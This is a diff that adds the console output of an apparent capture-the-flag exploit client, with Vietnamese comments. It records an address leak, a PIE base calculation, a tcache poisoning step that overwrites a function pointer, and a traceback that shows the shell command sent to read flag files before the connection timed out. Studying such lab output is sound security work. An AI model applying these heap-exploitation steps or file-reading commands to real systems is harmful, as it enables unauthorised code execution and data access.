@@ -1,0 +1,29 @@
+[*] key   = 1e8521a5d39a5272b18eebc2b9c12236
+[*] state = 91773789e379aa4c00a3efc2f817c993
+[*] handshake reply = 0400  (thành công)
+[*] INFO -> b'\x16\x00\x90\xc3\x1b\x0fVU'
+[+] fnptr @0x40c0 = 0x55560f1bc390  ->  base = 0x55560f1bb000
+[*] hai chunk cùng bin, để forged nằm ở vị trí pop thứ hai
+[*] P2>>12 = 0x55563e996  (P2 ~ 0x55563e996000)
+    poison         -> 1200  status=OK
+[*] [0x40c0] = 0x55560f1bc150  (kỳ vọng 0x55560f1bc150)
+Traceback (most recent call last):
+  File "C:\Users\Administrator\Documents\Qoder\2026-09-26\45656d97\CTF-Writeups\code-breaker\client.py", line 208, in <module>
+    sys.exit(main())
+             ^^^^^^
+  File "C:\Users\Administrator\Documents\Qoder\2026-09-26\45656d97\CTF-Writeups\code-breaker\client.py", line 194, in main
+    out = ch.cmd(b"\x15" + b"cat /flag* /app/flag* ./flag* 2>&1; ls /\n")
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Administrator\Documents\Qoder\2026-09-26\45656d97\CTF-Writeups\code-breaker\client.py", line 104, in cmd
+    return self.recv() if read else None
+           ^^^^^^^^^^^
+  File "C:\Users\Administrator\Documents\Qoder\2026-09-26\45656d97\CTF-Writeups\code-breaker\client.py", line 92, in recv
+    b = self.recv_raw()
+        ^^^^^^^^^^^^^^^
+  File "C:\Users\Administrator\Documents\Qoder\2026-09-26\45656d97\CTF-Writeups\code-breaker\client.py", line 83, in recv_raw
+    return self._raw_recv(ln)
+           ^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Administrator\Documents\Qoder\2026-09-26\45656d97\CTF-Writeups\code-breaker\client.py", line 75, in _raw_recv
+    c = self.s.recv(n - len(buf))
+        ^^^^^^^^^^^^^^^^^^^^^^^^^
+TimeoutError: timed out
